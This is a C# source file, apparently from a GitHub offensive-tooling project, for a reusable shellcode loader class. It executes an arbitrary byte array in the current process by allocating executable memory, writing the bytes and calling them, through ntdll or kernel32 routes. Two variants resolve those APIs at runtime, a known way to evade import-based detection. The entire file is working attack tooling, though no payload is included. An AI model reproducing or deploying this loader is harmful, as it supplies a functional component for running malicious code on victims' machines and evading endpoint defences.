using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32.SafeHandles;
using static ShellCodeLoader.Shared;
/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Please let this credit for all the time I worked on ||
 */
namespace ShellCodeLoader
{

    public class ShellCodeLoader : IDisposable
    {
        private byte[] ShellCode;
        private IntPtr ptr;
        private uint RegionSize;
        /// <summary>
        /// Default is false.
        /// </summary>
        public bool Asynchronous { get; set; }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void ShellCodeCaller();

        public ShellCodeLoader(byte[] shellCode) 
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.ptr = IntPtr.Zero;
            this.Asynchronous = false;
        }

        public void LoadWithNT() 
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { NT(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
                //Replace Task.Run with Task.Factory.StartNew for .net 4
                /*Task.Run(() =>
                {
                    NT();
                });*/
            }
            else 
            {
                NT();
            }
        }

        public void LoadWithKernel32()
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { Kernel32(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
            }
            else 
            {
                Kernel32();
            }       
        }

        public void LoadWithNTDelegates()
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { NTDelegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);

            }
            else 
            {
                NTDelegates();
            }
        }

        public void LoadWithKernel32Delegates() 
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { Kernel32Delegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
            }
            else
            {
                Kernel32Delegates();
            }
        }

        private void NT() 
        {
            Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
            PageProtection flOld = new PageProtection();
            Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);
            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();
            Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, FreeType.MEM_RELEASE);
        }

        private void Kernel32() 
        {
            this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr writtenBytes;
            Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
            PageProtection flOld;
            Imports.VirtualProtect(ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);
            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();
            Imports.VirtualFree(ptr, (uint)0, FreeType.MEM_RELEASE);
        }

        private void NTDelegates() 
        {
            IntPtr ExportedNtAllocateVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtAllocateVirtualMemory");
            Imports.Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = (Imports.Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtAllocateVirtualMemory, typeof(Imports.Delegates.NtAllocateVirtualMemory));
            NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            IntPtr ExportedNtWriteVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtWriteVirtualMemory");
            Imports.Delegates.NtWriteVirtualMemory NtWriteVirtualMemory = (Imports.Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtWriteVirtualMemory, typeof(Imports.Delegates.NtWriteVirtualMemory));
            NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);

            PageProtection flOld = new PageProtection();
            IntPtr ExportedNtProtectVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtProtectVirtualMemory");
            Imports.Delegates.NtProtectVirtualMemory NtProtectVirtualMemory = (Imports.Delegates.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtProtectVirtualMemory, typeof(Imports.Delegates.NtProtectVirtualMemory));
            NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);

            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();

            IntPtr ExportedNtFreeVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtFreeVirtualMemory");
            Imports.Delegates.NtFreeVirtualMemory NtFreeVirtualMemory = (Imports.Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtFreeVirtualMemory, typeof(Imports.Delegates.NtFreeVirtualMemory));
            NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, FreeType.MEM_RELEASE);
        }

        private void Kernel32Delegates() 
        {
            IntPtr ExportedVirtualAlloc = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualAlloc");
            Imports.Delegates.VirtualAlloc VirtualAlloc = (Imports.Delegates.VirtualAlloc)Marshal.GetDelegateForFunctionPointer(ExportedVirtualAlloc, typeof(Imports.Delegates.VirtualAlloc));
            this.ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);

            UIntPtr writtenBytes;
            IntPtr ExportedWriteProcessMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "WriteProcessMemory");
            Imports.Delegates.WriteProcessMemory WriteProcessMemory = (Imports.Delegates.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(ExportedWriteProcessMemory, typeof(Imports.Delegates.WriteProcessMemory));
            WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);

            PageProtection flOld;
            IntPtr ExportedVirtualProtect = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualProtect");
            Imports.Delegates.VirtualProtect VirtualProtect = (Imports.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(ExportedVirtualProtect, typeof(Imports.Delegates.VirtualProtect));
            VirtualProtect(ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);

            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();

            IntPtr ExportedVirtualFree = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualFree");
            Imports.Delegates.VirtualFree VirtualFree = (Imports.Delegates.VirtualFree)Marshal.GetDelegateForFunctionPointer(ExportedVirtualFree, typeof(Imports.Delegates.VirtualFree));
            Imports.VirtualFree(ptr, (uint)0, FreeType.MEM_RELEASE);
        }
        
        private static class Imports 
        {

            internal const String KERNEL32 = "kernel32.dll";
            internal const String NTDLL = "ntdll.dll";

            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);
          

          
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
         
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
          
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
          
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr GetCurrentProcess();

            [DllImport(KERNEL32)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport(KERNEL32)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            internal static class Delegates
            {
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
            }
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
